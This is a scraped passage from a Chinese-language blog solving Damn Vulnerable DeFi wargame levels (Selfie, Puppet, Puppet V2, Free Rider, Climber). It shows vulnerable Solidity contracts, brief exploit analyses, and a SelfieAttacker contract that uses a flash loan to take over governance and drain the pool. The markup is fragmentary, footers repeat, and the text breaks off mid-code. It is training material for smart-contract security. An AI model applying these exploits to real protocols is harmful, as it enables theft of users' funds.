class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">interface ERC20Snapshot1&#123;</span><br><span class="line">    function transfer(address,uint)external;</span><br><span class="line">&#125;</span><br><span class="line">interface SelfiePool1&#123;</span><br><span class="line">    function flashLoan(uint)external;</span><br><span class="line">&#125;</span><br><span class="line">interface SimpleGovernance1&#123;</span><br><span class="line">    function queueAction(address,bytes calldata ,uint)external returns(uint);</span><br><span class="line">&#125;</span><br><span class="line">interface DamnValuableTokenSnapshot1&#123;</span><br><span class="line">    function snapshot()external;</span><br><span class="line">&#125;</span><br><span class="line">contract SelfieAttacker &#123;</span><br><span class="line"></span><br><span class="line">    ERC20Snapshot1 public token;</span><br><span class="line">    SelfiePool1 private immutable pool;</span><br><span class="line">    SimpleGovernance1 private immutable governance;</span><br><span class="line">    address payable attacker;</span><br><span class="line">    uint256 public actionId;</span><br><span class="line"></span><br><span class="line">    constructor (address tokenAddress, address poolAddress, address governanceAddress, address attackerAddress) &#123;</span><br><span class="line">        token = ERC20Snapshot1(tokenAddress);</span><br><span class="line">        pool = SelfiePool1(poolAddress);</span><br><span class="line">        governance = SimpleGovernance1(governanceAddress);</span><br><span class="line">        attacker = payable(attackerAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 amount) external &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Take the max amount of flash loan from the pool, take governance over, queue an action that drains all funds</span><br><span class="line">    // from the pool, advance 2 days in time, execute action</span><br><span class="line">    function receiveTokens(address tokenAddress, uint256 amount) external &#123;</span><br><span class="line">        DamnValuableTokenSnapshot1 governanceToken = DamnValuableTokenSnapshot1(tokenAddress);</span><br><span class="line">        governanceToken.snapshot();</span><br><span class="line">        actionId = governance.queueAction(address(pool), abi.encodeWithSignature(&quot;drainAllFunds(address)&quot;,attacker), 0);</span><br><span class="line">        token.transfer(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x08Puppet"><a href="#0x08Puppet" class="headerlink" title="0x08Puppet"></a>0x08Puppet</h1><h2 id="Request-6"><a href="#Request-6" class="headerlink" title="Request"></a>Request</h2><p>There’s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.</p><p>There’s a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.</p><p>Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.</p><h2 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title PuppetPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract PuppetPool is ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    using Address for address payable;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public deposits;</span><br><span class="line">    address public immutable uniswapPair;</span><br><span class="line">    DamnValuableToken public immutable token;</span><br><span class="line">    </span><br><span class="line">    event Borrowed(address indexed account, uint256 depositRequired, uint256 borrowAmount);</span><br><span class="line"></span><br><span class="line">    constructor (address tokenAddress, address uniswapPairAddress) &#123;</span><br><span class="line">        token = DamnValuableToken(tokenAddress);</span><br><span class="line">        uniswapPair = uniswapPairAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Allows borrowing `borrowAmount` of tokens by first depositing two times their value in ETH</span><br><span class="line">    function borrow(uint256 borrowAmount) public payable nonReentrant &#123;</span><br><span class="line">        uint256 depositRequired = calculateDepositRequired(borrowAmount);</span><br><span class="line">        </span><br><span class="line">        require(msg.value &gt;= depositRequired, &quot;Not depositing enough collateral&quot;);</span><br><span class="line">        </span><br><span class="line">        if (msg.value &gt; depositRequired) &#123;</span><br><span class="line">            payable(msg.sender).sendValue(msg.value - depositRequired);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        deposits[msg.sender] = deposits[msg.sender] + depositRequired;</span><br><span class="line"></span><br><span class="line">        // Fails if the pool doesn&#x27;t have enough tokens in liquidity</span><br><span class="line">        require(token.transfer(msg.sender, borrowAmount), &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">        emit Borrowed(msg.sender, depositRequired, borrowAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function calculateDepositRequired(uint256 amount) public view returns (uint256) &#123;</span><br><span class="line">        return amount * _computeOraclePrice() * 2 / 10 ** 18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _computeOraclePrice() private view returns (uint256) &#123;</span><br><span class="line">        // calculates the price of the token in wei according to Uniswap pair</span><br><span class="line">        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     /**</span><br><span class="line">     ... functions to deposit, redeem, repay, calculate interest, and so on ...</span><br><span class="line">     */</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-6"><a href="#Analyse-6" class="headerlink" title="Analyse"></a>Analyse</h2><p>我们有25 ETH and 1000 DVTs，而如果想通过Puppet中borrow大量的token,我们需要将token的价格压低，因此我们用1000DVT来换出ETH，然后用ETH来borrow(借)token,就可以了</p><h1 id="0X09Puppet"><a href="#0X09Puppet" class="headerlink" title="0X09Puppet"></a>0X09Puppet</h1><h2 id="Request-7"><a href="#Request-7" class="headerlink" title="Request"></a>Request</h2><p>The developers of the last lending pool are saying that they’ve learned the lesson. And just released a new version!</p><p>Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.</p><p>You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)</p><h2 id="Code-7"><a href="#Code-7" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol&quot;;</span><br><span class="line">import &quot;@uniswap/v2-periphery/contracts/libraries/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    function transfer(address to, uint256 amount) external returns (bool);</span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external returns (bool);</span><br><span class="line">    function balanceOf(address account) external returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title PuppetV2Pool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract PuppetV2Pool &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    address private _uniswapPair;</span><br><span class="line">    address private _uniswapFactory;</span><br><span class="line">    IERC20 private _token;</span><br><span class="line">    IERC20 private _weth;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint256) public deposits;</span><br><span class="line">        </span><br><span class="line">    event Borrowed(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp);</span><br><span class="line"></span><br><span class="line">    constructor (</span><br><span class="line">        address wethAddress,</span><br><span class="line">        address tokenAddress,</span><br><span class="line">        address uniswapPairAddress,</span><br><span class="line">        address uniswapFactoryAddress</span><br><span class="line">    ) public &#123;</span><br><span class="line">        _weth = IERC20(wethAddress);</span><br><span class="line">        _token = IERC20(tokenAddress);</span><br><span class="line">        _uniswapPair = uniswapPairAddress;</span><br><span class="line">        _uniswapFactory = uniswapFactoryAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @notice Allows borrowing `borrowAmount` of tokens by first depositing three times their value in WETH</span><br><span class="line">     *         Sender must have approved enough WETH in advance.</span><br><span class="line">     *         Calculations assume that WETH and borrowed token have same amount of decimals.</span><br><span class="line">     */</span><br><span class="line">    function borrow(uint256 borrowAmount) external &#123;</span><br><span class="line">        require(_token.balanceOf(address(this)) &gt;= borrowAmount, &quot;Not enough token balance&quot;);</span><br><span class="line"></span><br><span class="line">        // Calculate how much WETH the user must deposit</span><br><span class="line">        uint256 depositOfWETHRequired = calculateDepositOfWETHRequired(borrowAmount);</span><br><span class="line">        </span><br><span class="line">        // Take the WETH</span><br><span class="line">        _weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);</span><br><span class="line"></span><br><span class="line">        // internal accounting</span><br><span class="line">        deposits[msg.sender] += depositOfWETHRequired;</span><br><span class="line"></span><br><span class="line">        require(_token.transfer(msg.sender, borrowAmount));</span><br><span class="line"></span><br><span class="line">        emit Borrowed(msg.sender, depositOfWETHRequired, borrowAmount, block.timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) &#123;</span><br><span class="line">        return _getOracleQuote(tokenAmount).mul(3) / (10 ** 18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Fetch the price from Uniswap v2 using the official libraries</span><br><span class="line">    function _getOracleQuote(uint256 amount) private view returns (uint256) &#123;</span><br><span class="line">        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(</span><br><span class="line">            _uniswapFactory, address(_weth), address(_token)</span><br><span class="line">        );</span><br><span class="line">        return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-7"><a href="#Analyse-7" class="headerlink" title="Analyse"></a>Analyse</h2><p>与上一题大差不差，我们只需要将DVT的价格压低，然后在pool中购买就可以了</p><p>Free rider</p><p>-——————————–</p><p>Author: bcYng</p><p>Article is from: <a href="https://bcyng-w.github.io/post/Damn%20Vulnerable%20DeFi">https://bcyng-w.github.io/post/Damn%20Vulnerable%20DeFi</a></p><p>This content is shared under the CC BY-NC-SA 4.0 protocol (Non-Commercial)</p><p>Free rider</p><p>-——————————–</p><p>Author: bcYng</p><p>Article is from: <a href="https://bcyng-w.github.io/post/Damn%20Vulnerable%20DeFi">https://bcyng-w.github.io/post/Damn%20Vulnerable%20DeFi</a></p><p>This content is shared under the CC BY-NC-SA 4.0 protocol (Non-Commercial)</p><h1 id="0x0aFree-rider"><a href="#0x0aFree-rider" class="headerlink" title="0x0aFree rider"></a>0x0aFree rider</h1><h2 id="Request-8"><a href="#Request-8" class="headerlink" title="Request"></a>Request</h2><p>A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.</p><p>A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn’t know how to do it. So it’s offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.</p><p>You want to build some rep with this buyer, so you’ve agreed with the plan.</p><p>Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.</p><h2 id="Code-8"><a href="#Code-8" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableNFT.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title FreeRiderNFTMarketplace</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract FreeRiderNFTMarketplace is ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    using Address for address payable;</span><br><span class="line"></span><br><span class="line">    DamnValuableNFT public token;</span><br><span class="line">    uint256 public amountOfOffers;</span><br><span class="line"></span><br><span class="line">    // tokenId -&gt; price</span><br><span class="line">    mapping(uint256 =&gt; uint256) private offers;</span><br><span class="line"></span><br><span class="line">    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);</span><br><span class="line">    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);</span><br><span class="line">    </span><br><span class="line">    constructor(uint8 amountToMint) payable &#123;</span><br><span class="line">        require(amountToMint &lt; 256, &quot;Cannot mint that many tokens&quot;);</span><br><span class="line">        token = new DamnValuableNFT();</span><br><span class="line"></span><br><span class="line">        for(uint8 i = 0; i &lt; amountToMint; i++) &#123;</span><br><span class="line">            token.safeMint(msg.sender);</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant &#123;</span><br><span class="line">        require(tokenIds.length &gt; 0 &amp;&amp; tokenIds.length == prices.length);</span><br><span class="line">        for (uint256 i = 0; i &lt; tokenIds.length; i++) &#123;</span><br><span class="line">            _offerOne(tokenIds[i], prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _offerOne(uint256 tokenId, uint256 price) private &#123;</span><br><span class="line">        require(price &gt; 0, &quot;Price must be greater than zero&quot;);</span><br><span class="line"></span><br><span class="line">        require(</span><br><span class="line">            msg.sender == token.ownerOf(tokenId),</span><br><span class="line">            &quot;Account offering must be the owner&quot;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        require(</span><br><span class="line">            token.getApproved(tokenId) == address(this) ||</span><br><span class="line">            token.isApprovedForAll(msg.sender, address(this)),</span><br><span class="line">            &quot;Account offering must have approved transfer&quot;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        offers[tokenId] = price;</span><br><span class="line"></span><br><span class="line">        amountOfOffers++;</span><br><span class="line"></span><br><span class="line">        emit NFTOffered(msg.sender, tokenId, price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant &#123;</span><br><span class="line">        for (uint256 i = 0; i &lt; tokenIds.length; i++) &#123;</span><br><span class="line">            _buyOne(tokenIds[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _buyOne(uint256 tokenId) private &#123;       </span><br><span class="line">        uint256 priceToPay = offers[tokenId];</span><br><span class="line">        require(priceToPay &gt; 0, &quot;Token is not being offered&quot;);</span><br><span class="line"></span><br><span class="line">        require(msg.value &gt;= priceToPay, &quot;Amount paid is not enough&quot;);</span><br><span class="line"></span><br><span class="line">        amountOfOffers--;</span><br><span class="line"></span><br><span class="line">        // transfer from seller to buyer</span><br><span class="line">        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);</span><br><span class="line"></span><br><span class="line">        // pay seller</span><br><span class="line">        payable(token.ownerOf(tokenId)).sendValue(priceToPay);</span><br><span class="line"></span><br><span class="line">        emit NFTBought(msg.sender, tokenId, priceToPay);</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-8"><a href="#Analyse-8" class="headerlink" title="Analyse"></a>Analyse</h2><p>这个漏洞主要在于 _buyOne()的时候是先把NFT转给了买方，然后再把钱支付给NFT的owner。感觉没毛病啊，但是，NFT已经转给买方了，那么owner自然是买方，相当于用买过NFT之后，又将钱转给了自己，是不是有毛病了。同时buyMany（）也有毛病，它的逻辑是有毛病的。我只需要支付一次msg.value然后可以循环买到NFT，这个漏洞就是多重调用的漏洞，比较常见，也比较好玩，需要注意一下。</p><h1 id="0x0c-Climer"><a href="#0x0c-Climer" class="headerlink" title="0x0c Climer"></a>0x0c Climer</h1><h2 id="Request-9"><a href="#Request-9" class="headerlink" title="Request"></a>Request</h2><p>There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.</p><p>The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.</p><p>On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.</p><p>On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.</p><p>Your goal is to empty the vault.</p><h2 id="Code-9"><a href="#Code-9" class="headerlink" title="Code"></a>Code</h2><h3 id="ClimberVault"><a href="#ClimberVault" class="headerlink" title="ClimberVault"></a>ClimberVault</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">import &quot;./ClimberTimelock.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title ClimberVault</span><br><span class="line"> * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable &#123;</span><br><span class="line"></span><br><span class="line">    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;</span><br><span class="line">    uint256 public constant WAITING_PERIOD = 15 days;</span><br><span class="line"></span><br><span class="line">    uint256 private _lastWithdrawalTimestamp;</span><br><span class="line">    address private _sweeper;</span><br><span class="line"></span><br><span class="line">    modifier onlySweeper() &#123;</span><br><span class="line">        require(msg.sender == _sweeper, &quot;Caller must be sweeper&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @custom:oz-upgrades-unsafe-allow constructor</span><br><span class="line">    constructor() initializer &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function initialize(address admin, address proposer, address sweeper) initializer external &#123;</span><br><span class="line">        // Initialize inheritance chain</span><br><span class="line">        __Ownable_init();</span><br><span class="line">        __UUPSUpgradeable_init();</span><br><span class="line"></span><br><span class="line">        // Deploy timelock and transfer ownership to it</span><br><span class="line">        transferOwnership(address(new ClimberTimelock(admin, proposer)));</span><br><span class="line"></span><br><span class="line">        _setSweeper(sweeper);</span><br><span class="line">        _setLastWithdrawal(block.timestamp);</span><br><span class="line">        _lastWithdrawalTimestamp = block.timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Allows the owner to send a limited amount of tokens to a recipient every now and then</span><br><span class="line">    function withdraw(address tokenAddress, address recipient, uint256 amount) external onlyOwner &#123;</span><br><span class="line">        require(amount &lt;= WITHDRAWAL_LIMIT, &quot;Withdrawing too much&quot;);</span><br><span class="line">        require(block.timestamp &gt; _lastWithdrawalTimestamp + WAITING_PERIOD, &quot;Try later&quot;);</span><br><span class="line">        </span><br><span class="line">        _setLastWithdrawal(block.timestamp);</span><br><span class="line"></span><br><span class="line">        IERC20 token = IERC20(tokenAddress);</span><br><span class="line">        require(token.transfer(recipient, amount), &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Allows trusted sweeper account to retrieve any tokens</span><br><span class="line">    function sweepFunds(address tokenAddress) external onlySweeper &#123;</span><br><span class="line">        IERC20 token = IERC20(tokenAddress);</span><br><span class="line">        require(token.transfer(_sweeper, token.balanceOf(address(this))), &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSweeper() external view returns (address) &#123;</span><br><span class="line">        return _sweeper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _setSweeper(address newSweeper) internal &#123;</span><br><span class="line">        _sweeper = newSweeper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getLastWithdrawalTimestamp() external view returns (uint256) &#123;</span><br><span class="line">        return _lastWithdrawalTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _setLastWithdrawal(uint256 timestamp) internal &#123;</span><br><span class="line">        _lastWithdrawalTimestamp = timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade</span><br><span class="line">    function _authorizeUpgrade(address newImplementation) internal onlyOwner override &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ClimberTimelock</p><p>-——————————–</p><p>Author: bcYng</p><p>Article is from: <a href="https://bcyng-w.github.io/post/D3CTF">https://bcyng-w.github.io/post/D3CTF</a></p><p>This content is shared under the CC BY-NC-SA 4.0 protocol (Non-Commercial)</p><p>ClimberTimelock</p><p>-——————————–</p><p>Author: bcYng</p><p>Article is from: <a href="https://bcyng-w.github.io/post/D3CTF">https://bcyng-w.github.io/post/D3CTF</a></p><p>This content is shared under the CC BY-NC-SA 4.0 protocol (Non-Commercial)</p><h3 id="ClimberTimelock"><a href="#ClimberTimelock" class="headerlink" title="ClimberTimelock"></a>ClimberTimelock</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 